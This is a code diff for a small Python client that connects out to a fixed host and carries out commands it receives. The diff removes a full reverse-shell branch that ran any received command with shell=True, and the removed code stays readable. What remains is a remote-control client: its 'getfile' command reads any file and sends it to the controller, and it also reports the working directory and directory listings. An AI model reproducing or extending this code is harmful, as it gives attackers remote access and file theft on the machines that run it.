@@ -1,10 +1,9 @@
 import os
 import socket
-import subprocess
 from time import sleep
 
-HOST = '127.0.0.1'
-PORT = 9999
+HOST = '192.168.0.10'
+PORT = 8080
 
 s = socket.socket()
 
@@ -19,7 +18,7 @@ def main():
 
 def session():
     while True:
-        data = s.recv(1024)
+        data = s.recv(128)
         cmd = str(data, encoding="utf-8", errors="ignore")
 
         if cmd == 'shutdown':
@@ -27,32 +26,27 @@ def session():
             exit(0)
 
         elif cmd[:7] == "getfile":
-            try:
-                f = open(cmd[8:], "rb")
-                data_to_send = f.read()
-                s.send(bytes(data_to_send))
-                f.close()
-                s.send(bytes("\nFile has been sent\n" + "\n", encoding="utf-8", errors="ignore"))
-            except Exception as ex:
-                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+            f = open(cmd[8:], "r")
+            file = str(f.read())
+            send_data(file)
+            f.close()
 
         elif cmd == "cd":
-            try:
-                pwd = os.getcwd()
-                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
-            except Exception as ex:
-                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+            pwd = os.getcwd()
+            send_data(pwd)
 
-        elif len(cmd) > 0:
-            try:
-                command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-                output_byte = command.stdout.read() + command.stderr.read()
-                output_str = str(output_byte, "utf-8", errors="ignore")
-                s.send(bytes(output_str, encoding="utf-8", errors="ignore"))
-            except Exception as ex:
-                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+        elif cmd == "ls":
+            files = ", ".join([f for f in os.listdir(os.getcwd())])
+            send_data(files)
 
+def send_data(data):
+    data = data.encode("utf-8")
+    length = len(data)
+    try:
+        s.send(length.to_bytes(4, 'big'))
+        s.send(data)
+    except Exception as e:
+        s.send(bytes("Error:\n" + str(e) + "\n", encoding="utf-8", errors="ignore"))
 
 if __name__ == '__main__':
     main()
